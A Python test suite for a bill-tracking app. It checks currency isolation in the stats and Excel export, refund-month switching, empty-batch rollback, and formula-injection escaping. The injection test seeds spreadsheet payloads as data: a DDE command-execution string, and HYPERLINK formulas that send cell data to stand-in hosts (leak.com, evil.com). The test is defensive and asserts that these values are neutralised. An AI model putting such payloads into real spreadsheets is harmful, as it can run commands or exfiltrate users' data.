"""Adversarial Empirical Challenge Test Suite (Milestone 5 Gate 2 - Challenger 2).

Empirical verification of 4 specific focus areas:
1. Multi-currency and FX pending isolation (USD, EUR, JPY vs CNY in /api/stats/* and /api/export.xlsx).
2. Refund mode dynamic switching (refund_month vs original_month across month boundaries).
3. Empty batch rollback atomicity (deleting batch with 0 transactions).
4. Excel export injection fuzzing (=, +, -, @ single-quote escaping in Sheet 1, formula integrity in Sheet 2).
"""

from __future__ import annotations

import io
import json
from pathlib import Path
import sqlite3
from typing import Generator

import openpyxl
import pytest
from fastapi.testclient import TestClient

from billapp.app import create_app
from billapp.classify.categories import CategoryService
from billapp.core.db import create_connection, init_db
from billapp.dedup.engine import rollback_import_batch
from billapp.export import generate_excel_export, sanitize_cell_value
from billapp.stats import (
    calculate_stats_account,
    calculate_stats_category,
    calculate_stats_heatmap,
    calculate_stats_merchant,
    calculate_stats_summary,
    calculate_stats_trend,
)


@pytest.fixture
def test_app(tmp_path: Path) -> Generator[Tuple[TestClient, Path], None, None]:
    """TestClient fixture with isolated SQLite database and seed categories/accounts."""
    db_file = tmp_path / "challenger_m5_r2.db"
    conn = init_db(str(db_file))
    CategoryService.init_builtin_categories(conn)
    conn.execute("INSERT INTO accounts (id, kind, bank, tail, alias) VALUES (1, 'wallet', 'Alipay', NULL, '支付宝余额')")
    conn.execute("INSERT INTO accounts (id, kind, bank, tail, alias) VALUES (2, 'bank_debit', 'BOC', '6666', '中行借记卡')")
    conn.execute("INSERT INTO accounts (id, kind, bank, tail, alias) VALUES (3, 'bank_credit', 'ICBC', '8801', '工行信用卡')")
    conn.execute("INSERT INTO import_batches (id, file_name, file_sha1, file_size, source) VALUES (1, 'challenger_batch.csv', 'sha1_test', 1024, 'alipay')")
    conn.commit()
    conn.close()

    app = create_app(db_path=str(db_file))
    with TestClient(app) as client:
        yield client, db_file


# =========================================================================
# Focus Area 1: Multi-Currency & FX Pending Isolation
# =========================================================================

def test_multi_currency_and_fx_pending_isolation(test_app: Tuple[TestClient, Path]):
    """Adversarial stress: Verify USD, EUR, and JPY transactions do not pollute CNY totals
    in ANY /api/stats/* endpoint or Sheet 2 of /api/export.xlsx, and FX pending fields are exact.
    """
    client, db_file = test_app
    conn = create_connection(str(db_file))

    cat_dining = conn.execute("SELECT id FROM categories WHERE key = 'food.dining'").fetchone()["id"]
    cat_shopping = conn.execute("SELECT id FROM categories WHERE key = 'shopping.daily'").fetchone()["id"]

    # 1. Seed CNY baseline transactions:
    # 2026-10: Expense 100.00 CNY (10000 cents), Income 500.00 CNY (50000 cents)
    conn.execute(
        """
        INSERT INTO transactions (id, batch_id, source, account_id, txn_time, time_precision, amount_cents, currency, direction, counterparty, description, category_id, fingerprint)
        VALUES (101, 1, 'alipay', 1, '2026-10-10 12:00:00', 'second', 10000, 'CNY', 'expense', '本地餐馆', '午餐', ?, 'fp_101')
        """,
        (cat_dining,),
    )
    conn.execute(
        """
        INSERT INTO transactions (id, batch_id, source, account_id, txn_time, time_precision, amount_cents, currency, direction, counterparty, description, category_id, fingerprint)
        VALUES (102, 1, 'alipay', 1, '2026-10-11 10:00:00', 'second', 50000, 'CNY', 'income', '公司', '薪水', NULL, 'fp_102')
        """
    )

    # 2. Seed foreign currency transactions (USD, EUR, JPY):
    # - USD 50.00 expense (5000 cents)
    # - EUR 30.00 expense (3000 cents)
    # - JPY 10000 expense (1000000 cents)
    # - USD 20.00 income (2000 cents)
    conn.execute(
        """
        INSERT INTO transactions (id, batch_id, source, account_id, txn_time, time_precision, amount_cents, currency, direction, counterparty, description, category_id, fingerprint)
        VALUES (201, 1, 'icbc_credit', 3, '2026-10-12 14:00:00', 'second', 5000, 'USD', 'expense', 'Amazon US', 'Books', ?, 'fp_201')
        """,
        (cat_shopping,),
    )
    conn.execute(
        """
        INSERT INTO transactions (id, batch_id, source, account_id, txn_time, time_precision, amount_cents, currency, direction, counterparty, description, category_id, fingerprint)
        VALUES (202, 1, 'icbc_credit', 3, '2026-10-13 16:00:00', 'second', 3000, 'EUR', 'expense', 'EuroShop', 'Souvenir', ?, 'fp_202')
        """,
        (cat_shopping,),
    )
    conn.execute(
        """
        INSERT INTO transactions (id, batch_id, source, account_id, txn_time, time_precision, amount_cents, currency, direction, counterparty, description, category_id, fingerprint)
        VALUES (203, 1, 'icbc_credit', 3, '2026-10-14 18:00:00', 'second', 1000000, 'JPY', 'expense', 'Tokyo Store', 'Electronics', ?, 'fp_203')
        """,
        (cat_shopping,),
    )
    conn.execute(
        """
        INSERT INTO transactions (id, batch_id, source, account_id, txn_time, time_precision, amount_cents, currency, direction, counterparty, description, category_id, fingerprint)
        VALUES (204, 1, 'icbc_credit', 3, '2026-10-15 09:00:00', 'second', 2000, 'USD', 'income', 'US Client', 'Consulting', NULL, 'fp_204')
        """
    )
    conn.commit()

    # --- Verification 1A: /api/stats/summary ---
    resp_sum = client.get("/api/stats/summary", params={"from": "2026-10-01", "to": "2026-10-31"})
    assert resp_sum.status_code == 200
    sum_data = resp_sum.json()

    # Total CNY expense must strictly be 10,000 cents (100.00 CNY)
    assert sum_data["total_expense_cents"] == 10000
    assert sum_data["expense_net"] == 10000
    # Total CNY income must strictly be 50,000 cents (500.00 CNY)
    assert sum_data["total_income_cents"] == 50000
    assert sum_data["income"] == 50000
    assert sum_data["balance"] == 40000

    # Foreign currency must be cleanly isolated and reported under FX pending:
    # 4 foreign transactions total (3 expenses + 1 income)
    assert sum_data["fx_pending_count"] == 4
    fx_map = {item["currency"]: item["amount"] for item in sum_data["fx_pending_amounts"]}
    assert fx_map["USD"] == 7000  # 5000 + 2000
    assert fx_map["EUR"] == 3000
    assert fx_map["JPY"] == 1000000

    # --- Verification 1B: /api/stats/trend ---
    resp_trend = client.get("/api/stats/trend", params={"granularity": "monthly"})
    assert resp_trend.status_code == 200
    trend_data = resp_trend.json()
    assert len(trend_data) == 1
    assert trend_data[0]["period"] == "2026-10"
    assert trend_data[0]["expense_cents"] == 10000
    assert trend_data[0]["income_cents"] == 50000

    # --- Verification 1C: /api/stats/category ---
    resp_cat = client.get("/api/stats/category", params={"direction": "expense"})
    assert resp_cat.status_code == 200
    cat_data = resp_cat.json()
    # Total cents must be exactly 10,000 (dining only; shopping was USD/EUR/JPY so 0 CNY)
    assert cat_data["total_cents"] == 10000
    cat_keys = [item["name"] for item in cat_data["items"]]
    assert "餐饮美食" in cat_keys
    assert "购物消费" not in cat_keys  # Shopping was entirely in USD/EUR/JPY!

    # --- Verification 1D: /api/stats/merchant ---
    resp_merch = client.get("/api/stats/merchant")
    assert resp_merch.status_code == 200
    merch_data = resp_merch.json()
    assert merch_data["total_expense_cents"] == 10000
    merch_names = [item["merchant"] for item in merch_data["items"]]
    assert "本地餐馆" in merch_names
    assert "Amazon US" not in merch_names
    assert "Tokyo Store" not in merch_names

    # --- Verification 1E: /api/stats/heatmap ---
    resp_heat = client.get("/api/stats/heatmap", params={"year": 2026, "mode": "calendar"})
    assert resp_heat.status_code == 200
    heat_data = resp_heat.json()
    total_heat_cents = sum(item["expense_cents"] for item in heat_data["calendar_items"])
    assert total_heat_cents == 10000

    # --- Verification 1F: /api/stats/account ---
    resp_acc = client.get("/api/stats/account")
    assert resp_acc.status_code == 200
    acc_data = resp_acc.json()
    # Only Alipay (account 1) had CNY activity: 10000 out, 50000 in
    assert acc_data["total_out_cents"] == 10000
    assert acc_data["total_in_cents"] == 50000
    # ICBC (account 3) has 0 CNY out and 0 CNY in
    icbc_item = next((item for item in acc_data["items"] if item["account_id"] == 3), None)
    assert icbc_item is None or (icbc_item["total_out_cents"] == 0 and icbc_item["total_in_cents"] == 0)

    # --- Verification 1G: /api/export.xlsx ---
    resp_export = client.get("/api/export.xlsx")
    assert resp_export.status_code == 200
    assert resp_export.headers["content-type"] == "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"

    wb = openpyxl.load_workbook(io.BytesIO(resp_export.content), data_only=True)
    ws1 = wb["交易明细"]
    ws2 = wb["月度分类透视表"]

    # Sheet 1 has header + 6 transactions = 7 rows
    assert ws1.max_row == 7

    # Sheet 2 monthly pivot MUST only aggregate CNY expenses (100.00 CNY for 2026-10)
    # Header: 一级分类, 二级分类, 2026-10, 合计
    ws2_headers = [c.value for c in ws2[1]]
    assert "2026-10" in ws2_headers
    month_col = ws2_headers.index("2026-10") + 1

    # Row 2 is 餐饮美食 (100.00)
    assert ws2.cell(row=2, column=1).value == "餐饮美食"
    assert ws2.cell(row=2, column=month_col).value == 100.00

    # Bottom summary row ("月度总支出") must be exactly 100.00
    summary_row = ws2.max_row
    assert ws2.cell(row=summary_row, column=1).value == "月度总支出"
    # When data_only=True, formula value might be None unless pre-evaluated, but if evaluated or checked raw:
    wb_raw = openpyxl.load_workbook(io.BytesIO(resp_export.content), data_only=False)
    ws2_raw = wb_raw["月度分类透视表"]
    # Ensure no shopping category was added to pivot
    cat_rows = [ws2_raw.cell(row=r, column=1).value for r in range(2, summary_row)]
    assert "购物消费" not in cat_rows
    assert "餐饮美食" in cat_rows


# =========================================================================
# Focus Area 2: Refund Mode Dynamic Switching Across Month Boundaries
# =========================================================================

def test_refund_mode_dynamic_switching(test_app: Tuple[TestClient, Path]):
    """Adversarial stress: Verify dynamic switching of refund_settings.mode
    between 'original_month' and 'refund_month' across month boundaries correctly
    recalculates net expenses immediately.
    """
    client, db_file = test_app
    conn = create_connection(str(db_file))
    cat_food = conn.execute("SELECT id FROM categories WHERE key = 'food.dining'").fetchone()["id"]

    # Month 1 (2026-08): Expense 100.00 CNY (10,000 cents)
    conn.execute(
        """
        INSERT INTO transactions (id, batch_id, source, account_id, txn_time, time_precision, amount_cents, refunded_cents, currency, direction, counterparty, description, category_id, fingerprint)
        VALUES (301, 1, 'alipay', 1, '2026-08-15 12:00:00', 'second', 10000, 4000, 'CNY', 'expense', '餐厅A', '大餐', ?, 'fp_301')
        """,
        (cat_food,),
    )

    # Month 2 (2026-09): Linked refund 40.00 CNY (4,000 cents) linked to 301
    conn.execute(
        """
        INSERT INTO transactions (id, batch_id, source, account_id, txn_time, time_precision, amount_cents, refunded_cents, currency, direction, counterparty, description, category_id, refund_of, fingerprint)
        VALUES (302, 1, 'alipay', 1, '2026-09-05 10:00:00', 'second', 4000, 0, 'CNY', 'refund', '餐厅A', '退款', ?, 301, 'fp_302')
        """,
        (cat_food,),
    )

    # Month 2 (2026-09): Independent expense 60.00 CNY (6,000 cents)
    conn.execute(
        """
        INSERT INTO transactions (id, batch_id, source, account_id, txn_time, time_precision, amount_cents, refunded_cents, currency, direction, counterparty, description, category_id, fingerprint)
        VALUES (303, 1, 'alipay', 1, '2026-09-20 18:00:00', 'second', 6000, 0, 'CNY', 'expense', '超市B', '日用品', ?, 'fp_303')
        """,
        (cat_food,),
    )
    conn.commit()

    # --- Phase 1: Mode = 'original_month' (Default) ---
    conn.execute(
        "INSERT INTO settings (key, value) VALUES ('refund_settings', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value",
        (json.dumps({"mode": "original_month"}),),
    )
    conn.commit()

    # August: 10,000 - 4,000 = 6,000 cents
    resp_aug_orig = client.get("/api/stats/summary", params={"from": "2026-08-01", "to": "2026-08-31"})
    assert resp_aug_orig.status_code == 200
    assert resp_aug_orig.json()["total_expense_cents"] == 6000

    # September: 6,000 cents (independent expense, refund was credited to August)
    resp_sep_orig = client.get("/api/stats/summary", params={"from": "2026-09-01", "to": "2026-09-30"})
    assert resp_sep_orig.status_code == 200
    assert resp_sep_orig.json()["total_expense_cents"] == 6000

    # Trend check
    trend_orig = client.get("/api/stats/trend", params={"granularity": "monthly"}).json()
    trend_orig_map = {item["period"]: item["expense_cents"] for item in trend_orig}
    assert trend_orig_map["2026-08"] == 6000
    assert trend_orig_map["2026-09"] == 6000

    # --- Phase 2: Dynamic switch to 'refund_month' ---
    conn.execute(
        "INSERT INTO settings (key, value) VALUES ('refund_settings', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value",
        (json.dumps({"mode": "refund_month"}),),
    )
    conn.commit()

    # August: retains full 10,000 cents
    resp_aug_rm = client.get("/api/stats/summary", params={"from": "2026-08-01", "to": "2026-08-31"})
    assert resp_aug_rm.status_code == 200
    assert resp_aug_rm.json()["total_expense_cents"] == 10000

    # September: 6,000 expense - 4,000 refund = 2,000 cents
    resp_sep_rm = client.get("/api/stats/summary", params={"from": "2026-09-01", "to": "2026-09-30"})
    assert resp_sep_rm.status_code == 200
    assert resp_sep_rm.json()["total_expense_cents"] == 2000

    # Trend check
    trend_rm = client.get("/api/stats/trend", params={"granularity": "monthly"}).json()
    trend_rm_map = {item["period"]: item["expense_cents"] for item in trend_rm}
    assert trend_rm_map["2026-08"] == 10000
    assert trend_rm_map["2026-09"] == 2000

    # --- Phase 3: Dynamic switch back to 'original_month' ---
    conn.execute(
        "INSERT INTO settings (key, value) VALUES ('refund_settings', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value",
        (json.dumps({"mode": "original_month"}),),
    )
    conn.commit()

    resp_aug_back = client.get("/api/stats/summary", params={"from": "2026-08-01", "to": "2026-08-31"})
    assert resp_aug_back.json()["total_expense_cents"] == 6000
    resp_sep_back = client.get("/api/stats/summary", params={"from": "2026-09-01", "to": "2026-09-30"})
    assert resp_sep_back.json()["total_expense_cents"] == 6000


# =========================================================================
# Focus Area 3: Empty Batch Rollback
# =========================================================================

def test_empty_batch_rollback_atomicity(test_app: Tuple[TestClient, Path]):
    """Adversarial stress: Verify deleting a batch with 0 transactions
    cleanly deletes the batch record, returns HTTP 200 with deleted_transactions=0,
    and subsequent deletion returns HTTP 404 NOT_FOUND.
    """
    client, db_file = test_app
    conn = create_connection(str(db_file))

    # Insert empty batch record with 0 transactions
    conn.execute(
        """
        INSERT INTO import_batches (id, file_name, file_sha1, file_size, source, row_count)
        VALUES (999, 'empty_batch.csv', 'sha1_empty_999', 0, 'alipay', 0)
        """
    )
    conn.commit()

    # Ensure batch exists in DB
    assert conn.execute("SELECT id FROM import_batches WHERE id = 999").fetchone() is not None
    # Ensure 0 transactions are associated
    assert conn.execute("SELECT COUNT(*) FROM transactions WHERE batch_id = 999").fetchone()[0] == 0

    # Execute DELETE /api/import/batches/999
    resp_del = client.delete("/api/import/batches/999")
    assert resp_del.status_code == 200
    data = resp_del.json()
    assert data["batch_id"] == 999
    assert data["deleted_transactions"] == 0
    assert data["status"] == "rolled_back"

    # Verify batch is completely purged from import_batches
    assert conn.execute("SELECT 1 FROM import_batches WHERE id = 999").fetchone() is None

    # Deleting again must return HTTP 404 NOT_FOUND
    resp_del2 = client.delete("/api/import/batches/999")
    assert resp_del2.status_code == 404
    assert resp_del2.json()["code"] == "NOT_FOUND"

    # Direct engine test on non-existent batch
    res_engine = rollback_import_batch(conn, 99999)
    assert res_engine["status"] == "not_found"
    assert res_engine["deleted_transactions"] == 0


# =========================================================================
# Focus Area 4: Excel Export Injection Fuzzing
# =========================================================================

def test_excel_export_injection_fuzzing(test_app: Tuple[TestClient, Path]):
    """Adversarial stress: Verify all formula injection attack vectors
    (=, +, -, @) across descriptions, counterparties, accounts, and notes
    are safely sanitized with a leading single quote in Sheet 1, while
    Sheet 2 dynamic formulas (=SUM(...)) remain intact and fully functional.
    """
    client, db_file = test_app
    conn = create_connection(str(db_file))

    # Create an account with formula injection characters in alias
    conn.execute(
        "INSERT INTO accounts (id, kind, bank, tail, alias) VALUES (88, 'wallet', 'FakeBank', '0000', '=HYPERLINK(\"http://evil.com\")')"
    )

    injection_payloads = [
        ("=cmd|'/C calc'!A0", "+cmd|'/C calc'!A0", "-SUM(1,2)", "@malicious_macro()"),
        ("+12345", "-456", "@SUM(A1:A10)", "=1+1"),
        ("=@SUM(1,1)", "+@malicious", "-@dangerous", "=@calc"),
        ("=HYPERLINK(\"http://leak.com?data=\"&A1,\"Click\")", "+100.00", "-99.99", "@alert(1)"),
    ]

    cat_food = conn.execute("SELECT id FROM categories WHERE key = 'food.dining'").fetchone()["id"]

    for idx, (cp, desc, note, pay_m) in enumerate(injection_payloads, start=1):
        conn.execute(
            """
            INSERT INTO transactions (
                id, batch_id, source, account_id, txn_time, time_precision,
                amount_cents, refunded_cents, currency, direction,
                counterparty, description, note, pay_method, category_id, fingerprint
            ) VALUES (?, 1, 'alipay', 88, '2026-11-01 12:00:00', 'second', 1000, 0, 'CNY', 'expense', ?, ?, ?, ?, ?, ?)
            """,
            (idx + 1000, cp, desc, note, pay_m, cat_food, f"fp_inj_{idx}"),
        )
    conn.commit()

    # Call /api/export.xlsx
    resp = client.get("/api/export.xlsx")
    assert resp.status_code == 200

    wb = openpyxl.load_workbook(io.BytesIO(resp.content), data_only=False)
    assert wb.sheetnames == ["交易明细", "月度分类透视表"]

    ws1 = wb["交易明细"]
    ws2 = wb["月度分类透视表"]

    # --- Verify Sheet 1 Escaping ---
    # Rows 2 to 5 correspond to our 4 injected transactions (ordered by txn_time DESC)
    for r in range(2, 6):
        cp_val = ws1.cell(row=r, column=4).value
        desc_val = ws1.cell(row=r, column=5).value
        acc_val = ws1.cell(row=r, column=12).value
        pay_val = ws1.cell(row=r, column=13).value
        note_val = ws1.cell(row=r, column=16).value

        # Must all start with single quote "'"
        for col_name, val in [("counterparty", cp_val), ("description", desc_val), ("account", acc_val), ("pay_method", pay_val), ("note", note_val)]:
            assert isinstance(val, str), f"Row {r} {col_name} should be string, got {val!r}"
            assert val.startswith("'"), f"Row {r} {col_name} must start with single quote, got: {val!r}"
            # Ensure the raw attack token is neutralized
            assert val[1] in ("=", "+", "-", "@"), f"Row {r} {col_name} missing expected neutralized token"

    # --- Verify Sheet 2 Dynamic Formula Functionality ---
    # Header: 一级分类, 二级分类, 2026-11, 合计
    headers2 = [c.value for c in ws2[1]]
    total_col_idx = len(headers2)

    # Category row 2: formula =SUM(C2:C2) in total column
    row2_formula = ws2.cell(row=2, column=total_col_idx).value
    assert isinstance(row2_formula, str)
    assert row2_formula.startswith("=SUM(")
    assert not row2_formula.startswith("'="), "Sheet 2 formula must NOT be single-quote escaped!"
    assert "#REF!" not in row2_formula
    assert "#VALUE!" not in row2_formula

    # Bottom summary row ("月度总支出")
    summary_row = ws2.max_row
    assert ws2.cell(row=summary_row, column=1).value == "月度总支出"
    sum_formula = ws2.cell(row=summary_row, column=3).value
    assert isinstance(sum_formula, str)
    assert sum_formula.startswith("=SUM(")
    assert not sum_formula.startswith("'=")


def test_sanitize_cell_value_unit():
    """Unit test verify sanitize_cell_value handles all types and edge cases."""
    assert sanitize_cell_value("=1+1") == "'=1+1"
    assert sanitize_cell_value("+cmd") == "'+cmd"
    assert sanitize_cell_value("-100") == "'-100"
    assert sanitize_cell_value("@macro") == "'@macro"
    assert sanitize_cell_value("normal_text") == "normal_text"
    assert sanitize_cell_value(123) == 123
    assert sanitize_cell_value(None) is None
    assert sanitize_cell_value("") == ""
